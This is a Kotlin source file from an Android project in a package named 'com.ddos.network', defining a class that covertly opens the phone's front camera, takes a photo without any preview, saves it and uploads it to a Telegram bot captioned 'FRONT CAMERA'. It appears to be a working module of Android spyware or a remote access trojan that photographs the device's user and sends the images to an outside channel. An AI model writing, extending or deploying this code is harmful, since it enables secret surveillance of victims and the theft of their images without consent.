package com.ddos.network

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import java.io.File
import java.io.FileOutputStream

class CameraCapture(
    private val context: Context,
    private val bot: TelegramBot
) {
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    fun capturePhoto() {
        startBackgroundThread()
        openCamera()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraThread").apply { start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun openCamera() {
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        try {
            // Find front camera
            var frontCameraId: String? = null
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = id
                    break
                }
            }

            if (frontCameraId == null) {
                Log.e("CameraCapture", "No front camera")
                return
            }

            // Check permission
            if (androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.CAMERA
                ) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return
            }

            manager.openCamera(frontCameraId, stateCallback, backgroundHandler)

        } catch (e: Exception) {
            Log.e("CameraCapture", "Open camera failed: ${e.message}")
        }
    }

    private val stateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            createCaptureSession()
        }

        override fun onDisconnected(camera: CameraDevice) {
            camera.close()
            cameraDevice = null
        }

        override fun onError(camera: CameraDevice, error: Int) {
            camera.close()
            cameraDevice = null
        }
    }

    private fun createCaptureSession() {
        val camera = cameraDevice ?: return

        imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            image?.let {
                saveImage(it)
                it.close()
            }
        }, backgroundHandler)

        val surface = imageReader?.surface

        try {
            camera.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        captureImage()
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {}
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e("CameraCapture", "Session failed: ${e.message}")
        }
    }

    private fun captureImage() {
        val camera = cameraDevice ?: return
        val session = captureSession ?: return
        val reader = imageReader ?: return

        try {
            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureRequest.addTarget(reader.surface)
            captureRequest.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)

            session.capture(captureRequest.build(), null, backgroundHandler)

        } catch (e: Exception) {
            Log.e("CameraCapture", "Capture failed: ${e.message}")
        }
    }

    private fun saveImage(image: Image) {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)

        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        val file = File(context.getExternalFilesDir(null), "camera_${System.currentTimeMillis()}.jpg")

        FileOutputStream(file).use { out ->
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
        }

        // Upload to Telegram
        bot.uploadPhoto(file, "📸 FRONT CAMERA")

        // Cleanup
        closeCamera()
    }

    private fun closeCamera() {
        captureSession?.close()
        cameraDevice?.close()
        imageReader?.close()

        captureSession = null
        cameraDevice = null
        imageReader = null

        backgroundThread?.quitSafely()
        backgroundThread = null
        backgroundHandler = null
    }
}
